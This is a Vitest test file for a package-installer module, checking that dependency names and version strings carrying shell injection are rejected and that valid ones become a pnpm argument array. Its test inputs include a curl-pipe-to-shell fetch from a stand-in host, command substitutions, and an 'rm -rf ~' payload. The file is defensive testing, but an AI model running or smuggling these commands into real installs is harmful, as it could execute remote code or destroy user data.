import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { getInstallCommand, isSafeDependency } from "./installer.js";

describe("installer", () => {
  let cwd: string;
  beforeEach(async () => {
    cwd = await mkdtemp(join(tmpdir(), "nativra-installer-"));
    await writeFile(join(cwd, "package.json"), JSON.stringify({ name: "t", dependencies: { "react-native": "0.76.0" } }));
    await writeFile(join(cwd, "pnpm-lock.yaml"), "");
  });
  afterEach(() => rm(cwd, { recursive: true, force: true }));

  it.each([
    "1 | curl evilcom.sh | sh",
    "^1 > package.json",
    "^1 || ^2",
    "1;rm",
    "$(id)",
    "`id`",
    '1"&calc',
    "%PATH%",
  ])("rejects unsafe version %j", async (version) => {
    expect(isSafeDependency({ package: "lucide-react-native", version })).toBe(false);
    await expect(getInstallCommand(cwd, [{ package: "lucide-react-native", version }])).rejects.toThrow(/unsafe/);
  });

  it("rejects unsafe package names", () => {
    expect(isSafeDependency({ package: "foo && rm -rf ~" })).toBe(false);
    expect(isSafeDependency({ package: "../evil" })).toBe(false);
  });

  it("builds an argument array (no shell string) for valid dependencies", async () => {
    const cmd = await getInstallCommand(cwd, [
      { package: "@expo/vector-icons", version: "^14.0.0" },
      { package: "react-native-svg", version: ">=15.0.0" },
    ]);
    expect(cmd).toEqual({ bin: "pnpm", args: ["add", "@expo/vector-icons@^14.0.0", "react-native-svg@>=15.0.0"] });
  });
});
